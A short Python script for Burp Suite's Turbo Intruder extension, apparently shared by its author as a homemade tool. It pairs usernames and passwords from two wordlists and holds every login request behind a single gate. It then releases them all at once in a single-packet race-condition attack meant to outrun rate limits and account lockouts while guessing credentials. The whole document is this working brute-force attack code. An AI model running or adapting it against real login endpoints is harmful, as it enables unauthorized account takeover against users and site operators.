
# made a tool based on pure logic, hope it works

def queueRequests(target, wordlists):
    # Using HTTP/2 and concurrentConnections=1 for single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    user_file = r"wordlists_path\users_payload.txt"
    pass_file = r"wordlists_path\passwords_payload.txt"

    try:
        # Read the files into memory
        with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
            users = [u.strip() for u in uf]
            passwords = [p.strip() for p in pf]

        # Use a single gate ID to group all requests
        gate_id = '1'

        print("[*] Queuing requests for parallel execution...")
        
        # Read both lists in Pitchfork style
        for user, password in zip(users, passwords):
            # Replace the placeholders in the base request
            req = target.req.replace('FUZZUSER', user).replace('FUZZPASS', password)
            
            # Queue the request and hold it behind the gate
            engine.queue(req, gate=gate_id)

        # Once every request has been queued, fire them all at once!
        print("[*] Opening gate! Sending all requests simultaneously...")
        engine.openGate(gate_id)

    except FileNotFoundError:
        print("[-] File not found! Double-check your Windows file paths.")

def handleResponse(req, interesting):
    table.add(req)
